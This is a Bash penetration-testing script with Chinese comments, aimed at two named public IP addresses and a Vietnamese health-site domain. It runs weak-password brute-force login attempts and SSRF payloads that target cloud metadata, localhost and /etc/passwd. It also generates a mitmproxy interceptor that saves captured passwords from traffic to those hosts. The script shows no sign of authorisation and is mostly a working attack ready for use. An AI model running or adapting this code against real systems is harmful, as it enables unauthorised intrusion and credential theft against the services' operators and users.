#!/bin/bash
# HTTP明文API深度测试脚本
# 目标: 113.190.232.99:8003 和 125.212.193.21:8886

WORK_DIR="/workspace/http_api_test"
mkdir -p $WORK_DIR && cd $WORK_DIR

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 HTTP明文API渗透测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ============ 目标1: EMS Logistics API ============
echo ""
echo "[*] 目标1: EMS Logistics (113.190.232.99:8003)"
echo ""

TARGET1="http://113.190.232.99:8003"

# 端点列表
EMS_ENDPOINTS=(
    "/api/Authorized/Login"
    "/api/Authorized/GetParams"
    "/api/Collect/CollectOrderPostman"
    "/api/Delivery/DeliveryPostman"
    "/api/Delivery/CheckLadingCode"
    "/api/VietMap/Route"
    "/api/VietMap/Search"
    "/api/Dictionary/GetPostOfficeByCode"
    "/api/CallCenter/CallHistory"
    "/api/DingDong/GetMainview"
)

echo "[*] 1.1 端点探活测试..."
for endpoint in "${EMS_ENDPOINTS[@]}"; do
    url="${TARGET1}${endpoint}"
    status=$(curl -s -o /dev/null -w "%{http_code}" "$url" -m 5)
    
    if [ "$status" == "000" ]; then
        echo "  [❌] $endpoint - 超时/无法访问"
    elif [ "$status" == "401" ] || [ "$status" == "403" ]; then
        echo "  [⚠️] $endpoint - HTTP $status (需要认证)"
    elif [ "$status" == "200" ]; then
        echo "  [✅] $endpoint - HTTP 200 (可能未授权)"
    else
        echo "  [ℹ️] $endpoint - HTTP $status"
    fi
done

echo ""
echo "[*] 1.2 弱口令爆破 - Login端点..."

# 常见弱密码
WEAK_CREDS=(
    "admin:admin"
    "admin:123456"
    "root:root"
    "test:test"
    "user:password"
    "ems:ems123"
)

for cred in "${WEAK_CREDS[@]}"; do
    username=$(echo $cred | cut -d':' -f1)
    password=$(echo $cred | cut -d':' -f2)
    
    response=$(curl -s "${TARGET1}/api/Authorized/Login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$username\",\"password\":\"$password\"}" \
        -m 5)
    
    if echo "$response" | grep -qiE "token|success|accessToken"; then
        echo "  [✅] 发现弱密码: $username:$password"
        echo "$username:$password|$response" >> ems_weak_creds.txt
    fi
done

echo ""
echo "[*] 1.3 VietMap API测试（可能SSRF）..."

# SSRF Payload
SSRF_PAYLOADS=(
    "http://127.0.0.1:22"
    "http://169.254.169.254/latest/meta-data/"
    "http://192.168.1.1"
    "file:///etc/passwd"
)

for payload in "${SSRF_PAYLOADS[@]}"; do
    response=$(curl -s "${TARGET1}/api/VietMap/Route?url=${payload}" -m 5)
    
    if echo "$response" | grep -qiE "root:|AWS|metadata"; then
        echo "  [✅] SSRF成功: $payload"
        echo "$payload|$response" >> ems_ssrf.txt
    fi
done

# ============ 目标2: Songkhoe API ============
echo ""
echo "[*] 目标2: Songkhoe (125.212.193.21:8886)"
echo ""

TARGET2="http://125.212.193.21:8886"

echo "[*] 2.1 路径密码认证测试..."

# URL路径密码认证（极度危险）
TEST_CREDS=(
    "admin:admin"
    "admin:123456"
    "test:test"
    "user:123456"
)

for cred in "${TEST_CREDS[@]}"; do
    username=$(echo $cred | cut -d':' -f1)
    password=$(echo $cred | cut -d':' -f2)
    
    # 特殊认证方式: /checklogin/{user}/{pass}/
    url="http://songkhoe.vn/checklogin/${username}/${password}/"
    
    response=$(curl -s "$url" -m 5)
    
    if echo "$response" | grep -qiE "success|true|token"; then
        echo "  [✅] 登录成功: $username:$password"
        echo "$username:$password|$response" >> songkhoe_creds.txt
    fi
done

echo ""
echo "[*] 2.2 API端点测试..."

SONGKHOE_ENDPOINTS=(
    "/ViewNewsApp"
    "/ViewsAppDisease"
    "/ViewsAppDiseasedetail"
)

for endpoint in "${SONGKHOE_ENDPOINTS[@]}"; do
    url="${TARGET2}${endpoint}"
    status=$(curl -s -o /dev/null -w "%{http_code}" "$url" -m 5)
    echo "  [$status] $endpoint"
done

# ============ 流量抓取 ============
echo ""
echo "[*] 3. 中间人攻击准备..."

cat > mitm_proxy.py << 'PYEOF'
#!/usr/bin/env python3
# HTTP明文流量抓取器

from mitmproxy import http
import json

def request(flow: http.HTTPFlow):
    # 记录所有HTTP请求
    if "113.190.232.99" in flow.request.pretty_url or \
       "125.212.193.21" in flow.request.pretty_url:
        
        print(f"\n[+] 拦截请求:")
        print(f"    URL: {flow.request.pretty_url}")
        print(f"    Method: {flow.request.method}")
        
        # 提取认证信息
        if flow.request.content:
            try:
                body = json.loads(flow.request.content)
                if 'password' in str(body):
                    print(f"    [!] 发现密码: {body}")
                    with open("captured_creds.txt", "a") as f:
                        f.write(f"{flow.request.pretty_url}|{body}\n")
            except:
                pass
PYEOF

echo "[*] MITM代理脚本已生成: mitm_proxy.py"
echo "    运行: mitmdump -s mitm_proxy.py -p 8080"

# ============ 结果汇总 ============
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 HTTP API测试结果"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "EMS弱密码: $(cat ems_weak_creds.txt 2>/dev/null | wc -l)"
echo "EMS SSRF: $(cat ems_ssrf.txt 2>/dev/null | wc -l)"
echo "Songkhoe凭据: $(cat songkhoe_creds.txt 2>/dev/null | wc -l)"
echo ""
echo "📁 结果文件:"
echo "  - ems_weak_creds.txt"
echo "  - ems_ssrf.txt"
echo "  - songkhoe_creds.txt"
echo "  - mitm_proxy.py (MITM脚本)"
echo ""
echo "✅ 测试完成！"
